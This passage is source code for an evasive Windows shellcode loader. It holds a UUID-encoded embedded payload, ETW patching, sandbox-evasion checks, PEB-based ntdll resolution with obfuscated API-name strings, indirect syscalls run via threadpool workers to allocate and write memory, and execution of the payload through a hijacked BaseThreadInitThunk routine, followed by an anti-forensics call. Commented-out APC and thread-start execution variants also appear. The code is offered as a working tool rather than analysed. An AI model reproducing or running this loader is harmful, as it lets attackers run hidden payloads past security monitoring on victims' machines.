        "000131e8-5900-348d-7083-eb0175ed8b54",
        "f6851824-0a74-c28b-2bc6-8a008802eb03",
        "8b0002c6-245c-4210-e9ef-0000008b4424",
        "24548b14-0f18-38b6-408b-cf8944241483",
        "c18301e1-d102-74ef-148b-f22bf78a0688",
        "83464202-01e9-f575-e9a4-00000033db43",
        "10245c89-9ce9-0000-00e8-ff0000008bd0",
        "75f68559-832b-02fa-7526-8d44241450e8",
        "000000e9-548b-1c24-8bf0-5985f674768b",
        "8acf2bca-8801-4202-4183-ee0175f5eb61",
        "14244c8b-448d-1424-83f6-012bd6c1e208",
        "8139b60f-00c7-fffe-ff03-fa4150894c24",
        "00a7e818-0000-8b59-c881-ff007d000072",
        "548b4101-1824-418d-0181-ff000500000f",
        "ff81c142-0080-0000-8d70-020f43f085f6",
        "ca8b1374-cf2b-018a-8802-424183ee0175",
        "245489f5-3318-46f6-eb18-8b4c24148b54",
        "018a1824-0288-4142-894c-241433f68954",
        "db851824-840f-fe9b-ffff-5f5e2bd55d8b",
        "c4835bc2-c314-8b56-7424-088b4e0c8d56",
        "ff418d08-4689-850c-c975-138b0e0fb601",
        "418d0289-8901-c706-460c-070000008b02",
        "000c8d5e-e8c1-8907-0a83-e001c35633f6",
        "2474ff46-e808-ffbc-ffff-ff74240c8d34",
        "ffb0e870-ffff-5959-85c0-75e58bc65ec3",
        "0c24548b-448b-0424-568b-f085d2741357",
        "10247c8b-f82b-0c8a-3788-0e4683ea0175",
        "c35e5ff5-448a-0824-8b4c-240c578b7c24",
        "8baaf308-2444-5f08-c38b-4424048b4c24",
        "108a5308-d284-0e74-8a19-84db74083ad3",
        "41400475-eceb-be0f-000f-be092bc15bc3",
        "0424548b-4c8b-0824-538a-0284c074138a",
        "74db8419-800d-20cb-0c20-3ac375044241",
        "be0fe7eb-0f02-09be-2bc1-5bc300000000",
        "00000000-9000-9090-9090-909090909090",
    };
;


// -bin
BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize);


int main(int argc, char *argv[]) {
performSweetSleep();

        executeAllChecksAndEvaluate("evasive_test.exe", argv[0]);

        if (everyThing() == EXIT_SUCCESS) {
            printf("\n[+] ETW Patched Successfully...\n");
        } else {
            printf("\n[-] ETW Patch Failed...\n");
        }
        ExecuteModifications(argc, argv);
            constexpr int numUuids = sizeof(UUIDs) / sizeof(UUIDs[0]);
            unsigned char magiccode[numUuids * 16];
            unsigned char* magiccodePtr = magiccode;
            convertUUIDsToMagicCode(UUIDs, magiccodePtr, numUuids);
            printf("[+] MagicCodePtr size: %zu bytes\n", sizeof(magiccodePtr));
            printf("[+] size of magiccode: %zu bytes\n", sizeof(magiccode));
            




    ///// Put everything after this line::!!!!

    ///


    PCWSTR binPath = nullptr;

    for (int i = 1; i < argc; ++i) {
        if (strcmp(argv[i], "-bin") == 0) {
            if (i + 1 >= argc || argv[i + 1][0] == '-') {
                fprintf(stderr, "[-] Error: '-bin' flag requires a valid file path argument.\n");
                fprintf(stderr, "    Usage: loader.exe <PID> -bin <path_to_magiccode>\n");
                exit(1);
            }

            size_t wlen = strlen(argv[i + 1]) + 1;
            wchar_t* wpath = new wchar_t[wlen];
            mbstowcs(wpath, argv[i + 1], wlen);
            binPath = wpath;
            break;
        }
    }


    // -bin
    if (binPath) {
        if (!ReadContents(binPath, &magic_code, &allocatedSize)) {
            fprintf(stderr, "[-] Failed to read binary file\n");
        } else {
            printf("\033[32m[+] Read binary file successfully, size: %zu bytes\033[0m\n", allocatedSize);
            // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
        }
    } else {
        magic_code = magiccode; 
        allocatedSize = sizeof(magiccode);
        printf("\033[32m[+] Using default magiccode with size: %zu bytes\033[0m\n", allocatedSize);
        // int ret = woodPecker(pid, pi.hProcess, magic_code, page_size, alloc_gran);
    }

    // -bin 


    LPVOID allocatedAddress = NULL;

    //print the first 8 bytes of the magiccode and the last 8 bytes:
    printf("First 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[0], magic_code[1], magic_code[2], magic_code[3], magic_code[4], magic_code[5], magic_code[6], magic_code[7]);
    printf("Last 8 bytes: %02x %02x %02x %02x %02x %02x %02x %02x\n", magic_code[sizeof(magic_code) - 8], magic_code[sizeof(magic_code) - 7], magic_code[sizeof(magic_code) - 6], magic_code[sizeof(magic_code) - 5], magic_code[sizeof(magic_code) - 4], magic_code[sizeof(magic_code) - 3], magic_code[sizeof(magic_code) - 2], magic_code[sizeof(magic_code) - 1]);
    

	const char libName[] = { 'n', 't', 'd', 'l', 'l', 0 };
    wchar_t wideLibName[32] = {0};

    for (int i = 0; libName[i] != 0; i++) {
        wideLibName[i] = (wchar_t)libName[i];
    }

	const char NtAllocateFuture[] = { 'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };
    const char TpAllocFuture[] = { 'T', 'p', 'A', 'l', 'l', 'o', 'c', 'W', 'o', 'r', 'k', 0 };
    const char TpPostFuture[] = { 'T', 'p', 'P', 'o', 's', 't', 'W', 'o', 'r', 'k', 0 };
    const char TpReleaseFuture[] = { 'T', 'p', 'R', 'e', 'l', 'e', 'a', 's', 'e', 'W', 'o', 'r', 'k', 0 };

    // HMODULE ntdllMod = GetModuleHandleA(libName);
    HMODULE ntdllMod = (HMODULE)DLLViaPEB(wideLibName);
    PVOID allocateFuture = GetFunctionAddress(NtAllocateFuture, ntdllMod);

    PVOID syscallAddr1 = findSyscallInstruction(NtAllocateFuture, (FARPROC)allocateFuture, 1);
    
    SSNAllocateVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)allocateFuture);
    if(SSNAllocateVirtualMemory) {
        printf("[+] Found syscall number: %d\n", SSNAllocateVirtualMemory);
    } else {
        printf("[-] Failed to find syscall number\n");
    }


    NTALLOCATEVIRTUALMEMORY_ARGS ntAllocateVirtualMemoryArgs = { 0 };
    ntAllocateVirtualMemoryArgs.pNtAllocateVirtualMemory = (UINT_PTR) syscallAddr1;
    ntAllocateVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntAllocateVirtualMemoryArgs.address = &allocatedAddress;
    ntAllocateVirtualMemoryArgs.size = &allocatedSize;
    ntAllocateVirtualMemoryArgs.permissions = PAGE_READWRITE;


    /// Set workers
    FARPROC pTpAllocWork = GetProcAddress(ntdllMod, TpAllocFuture);
    FARPROC pTpPostWork = GetProcAddress(ntdllMod, TpPostFuture);
    FARPROC pTpReleaseWork = GetProcAddress(ntdllMod, TpReleaseFuture);

    PTP_WORK WorkReturn = NULL;

    printf("[+] press enter to allocate memory\n");
    getchar();

    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn, (PTP_WORK_CALLBACK)AllocateMemory, &ntAllocateVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn);
    // getchar();
    printf("[+] Allocated size: %lu\n", allocatedSize);
    printf("[+] MagicCode size: %lu\n", sizeof(magic_code));
    printf("[+] allocatedAddress: %p\n", allocatedAddress);
/// Write memory: 
    // if(allocatedAddress == NULL) {
    //     // printf("[-] Failed to allocate memory\n");
    //     printf("allocatedAddress: %p\n", allocatedAddress);
    // }
    // printf("allocatedAddress: %p\n", allocatedAddress);
    // if(allocatedSize != sizeof(magiccode)) {
    //     printf("[-] Allocated size is not the same as magiccode size\n");
    //     printf("[-] Allocated size: %lu\n", allocatedSize);
    //     printf("[+] MagicCode size: %lu\n", sizeof(magiccode));
    // }


	///Write process memory: 
    const char NtWriteFuture[] = { 'N', 't', 'W', 'r', 'i', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y', 0 };

    PVOID writeFuture = GetFunctionAddress(NtWriteFuture, ntdllMod);
    PVOID syscallAddr2 = findSyscallInstruction(NtWriteFuture, (FARPROC)writeFuture, 1);
    SSNWriteVirtualMemory = GetsyscallNum((LPVOID)(uintptr_t)writeFuture);
    

    ULONG bytesWritten = 0;
    NTWRITEVIRTUALMEMORY_ARGS ntWriteVirtualMemoryArgs = { 0 };
    ntWriteVirtualMemoryArgs.pNtWriteVirtualMemory = (UINT_PTR) syscallAddr2;
    ntWriteVirtualMemoryArgs.hProcess = (HANDLE)-1;
    ntWriteVirtualMemoryArgs.address = allocatedAddress;
    ntWriteVirtualMemoryArgs.buffer = (PVOID)magic_code;
    ntWriteVirtualMemoryArgs.size = allocatedSize;
    ntWriteVirtualMemoryArgs.bytesWritten = bytesWritten;

    // // // / Set workers

    PTP_WORK WorkReturn2 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn2, (PTP_WORK_CALLBACK)WriteProcessMemoryCustom, &ntWriteVirtualMemoryArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn2);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn2);
    // printf("Bytes written: %lu\n", bytesWritten);
    if(WorkReturn2 == NULL) {
        printf("[-] Failed to write memory\n");
    } else {
        printf("[+] Memory written\n");
    }


    // change allocatedAddress to execute read: 
    DWORD oldProtect;
    VirtualProtect(allocatedAddress, allocatedSize, PAGE_EXECUTE_READ, &oldProtect);
    printf("[+] Memory changed to PAGE_EXECUTE_READ\n");


    //####END####
    anti_forensic();
    perform();
    
    //// Execution part: 
    // pRtlExitUserThread ExitThread = (pRtlExitUserThread)GetProcAddress(ntdllMod, "RtlExitUserThread");

    //     // // create a thread to call ExitThread, not the DLL entrypoint that has our magic code:
    // HANDLE hThread = NULL;
    // DWORD threadId = 0;
    // hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitThread, NULL, 0, &threadId);
    // if (hThread == NULL) {
    //     printf("Failed to create thread. Error: %x\n", GetLastError());
    //     return 1;
    // } else {
    //     printf("[+] RtlExitUserThread called successfully.\n");
    //     printf("[+] RtlExitUserThread will go through BaseThreadInitThunk\n");
    // }

    // wait for it:
    // WaitForSingleObject(hThread, INFINITE);
    // // /// 2. Set workers to execute code, only works for local address, we may run a trampoline code to execute remote code: 
    // PTP_WORK WorkReturn4 = NULL;
    // // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn4, (PTP_WORK_CALLBACK)ExitThread, NULL, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn4);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn4);
    // printf("[+] magiccode executed. \n");
    // // Wait for the magiccode to execute
    // DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
    // if (waitResult == WAIT_OBJECT_0) {
    //     printf("[+] magiccode execution completed\n");
    // } else {
    //     printf("[-] magiccode execution wait failed\n");
    // }

    // // RtlUserThreadStart: 

    // const char RtlThreadStartStr[] = { 'R', 't', 'l', 'U', 's', 'e', 'r', 'T', 'h', 'r', 'e', 'a', 'd', 'S', 't', 'a', 'r', 't', 0 };
    // RTLTHREADSTART_ARGS RtlThreadStartArgs = { 0 };
    // RtlThreadStartArgs.pRtlUserThreadStart = (UINT_PTR) GetProcAddress(ntdllMod, RtlThreadStartStr);
    // RtlThreadStartArgs.pThreadStartRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;
    // RtlThreadStartArgs.pContext = NULL;

    // // // // // / Set workers

    // PTP_WORK WorkReturn5 = NULL;
    // // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn5, (PTP_WORK_CALLBACK)RtlUserThreadStartCustom, &RtlThreadStartArgs, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn5);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn5);
    // // printf("Bytes written: %lu\n", bytesWritten);
    // if(WorkReturn5 == NULL) {
    //     printf("[-] Failed to RtlUserThreadStart\n");
    // } else {
    //     printf("[+] RtlUserThreadStart executed.\n");
    // }

////////////



    // const char BaseThreadInitStr[] = { 'B', 'a', 's', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'I', 'n', 'i', 't', 'T', 'h', 'u', 'n', 'k', 0 };

    BYTE *pXFGThunk = findBaseThreadInitXFGThunk((BYTE *)GetModuleHandleA("kernel32.dll"));
    if (!pXFGThunk) return 1;

    BASETHREADINITTHUNK_ARGS BaseThreadInitArgs = { 0 };
    // BaseThreadInitArgs.pBaseThreadInitThunk = (UINT_PTR) GetProcAddress(GetModuleHandleA("kernel32"), BaseThreadInitStr);
    BaseThreadInitArgs.pBaseThreadInitThunk = (UINT_PTR) pXFGThunk;
    BaseThreadInitArgs.LdrReserved = (LPTHREAD_START_ROUTINE)((char*)0x1111111);
    BaseThreadInitArgs.lpStartAddress = 0;
    BaseThreadInitArgs.GoGetGo = (LPTHREAD_START_ROUTINE)((char*)allocatedAddress);
    // BaseThreadInitArgs.lpParameter = NULL;


    // // / Set workers

    PTP_WORK WorkReturn5 = NULL;
    // getchar();
    ((TPALLOCWORK)pTpAllocWork)(&WorkReturn5, (PTP_WORK_CALLBACK)BaseThreadInitXFGThunkCustom, &BaseThreadInitArgs, NULL);
    ((TPPOSTWORK)pTpPostWork)(WorkReturn5);
    ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn5);
    // printf("Bytes written: %lu\n", bytesWritten);
    if(WorkReturn5 == NULL) {
        printf("[-] Failed to BaseThreadInitXFGThunkCustom\n");
    } else {
        printf("[+] BaseThreadInitXFGThunkCustom executed.\n");
    }

    DWORD waitResult = WaitForSingleObject((HANDLE)-1, INFINITE); // Use a reasonable timeout as needed
    if (waitResult == WAIT_OBJECT_0) {
        printf("[+] magiccode execution completed\n");
    } else {
        printf("[-] magiccode execution wait failed\n");
    }



    // 3. APC execution:     
    // const char NtQueueFutureApcEx2Str[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x', '2', 0 };

    // // NtQueueApcThreadEx_t pNtQueueApcThread = (NtQueueApcThreadEx_t)GetProcAddress(ntdllMod, NtQueueFutureApcEx2Str);

    // QUEUE_USER_APC_FLAGS apcFlags = QUEUE_USER_APC_FLAGS_NONE;
    // PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)allocatedAddress;

    // NTQUEUEAPCTHREADEX_ARGS ntQueueApcThreadExArgs = { 0 };
    // ntQueueApcThreadExArgs.pNtQueueApcThreadEx = (UINT_PTR) GetProcAddress(ntdllMod, NtQueueFutureApcEx2Str);
    // ntQueueApcThreadExArgs.hThread = GetCurrentThread();
    // ntQueueApcThreadExArgs.UserApcReserveHandle = NULL;
    // ntQueueApcThreadExArgs.QueueUserApcFlags = apcFlags;
    // ntQueueApcThreadExArgs.ApcRoutine = (PVOID)apcRoutine;


    // /// Set workers

    // const char NtTestFutureStr[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', 0 };
    // myNtTestAlert testAlert = (myNtTestAlert)GetProcAddress(ntdllMod, NtTestFutureStr);
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine,  
    // //     (PVOID)0,  
    // //     (PVOID)0,  
    // //     (PVOID)0 
    // //     );
    // // NTSTATUS result = pNtQueueApcThread(
    // //     GetCurrentThread(),  
    // //     NULL,  
    // //     apcFlags,  
    // //     (PVOID)apcRoutine
    // //     );
    // PTP_WORK WorkReturn3 = NULL;
    // getchar();
    // ((TPALLOCWORK)pTpAllocWork)(&WorkReturn3, (PTP_WORK_CALLBACK)NtQueueApcThreadCustom, &ntQueueApcThreadExArgs, NULL);
    // ((TPPOSTWORK)pTpPostWork)(WorkReturn3);
    // ((TPRELEASEWORK)pTpReleaseWork)(WorkReturn3);
    // // QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), (ULONG_PTR)0);
	// testAlert();
    getchar();
    //// Execution end..

    return 0;
}


void SimpleSleep(DWORD dwMilliseconds)
{
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL); // Create an unsignaled event
    if (hEvent != NULL)
    {
        WaitForSingleObjectEx(hEvent, dwMilliseconds, FALSE); // Wait for the specified duration
        CloseHandle(hEvent); // Clean up the event object
    }
}



BOOL ReadContents(PCWSTR Filepath, unsigned char** magiccode, SIZE_T* magiccodeSize)
{
    FILE* f = NULL;
    _wfopen_s(&f, Filepath, L"rb");
    if (!f) {
        return FALSE;
    }

    fseek(f, 0, SEEK_END);
    long fileSize = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (fileSize <= 0) {
        fclose(f);
        return FALSE;
    }

    unsigned char* buffer = (unsigned char*)malloc(fileSize);
    if (!buffer) {
        fclose(f);
        return FALSE;
    }

    size_t bytesRead = fread(buffer, 1, fileSize, f);
    fclose(f);

    if (bytesRead != fileSize) {
        free(buffer);
        return FALSE;
    }

    *magiccode = buffer;
    *magiccodeSize = (SIZE_T)fileSize;
    return TRUE;
}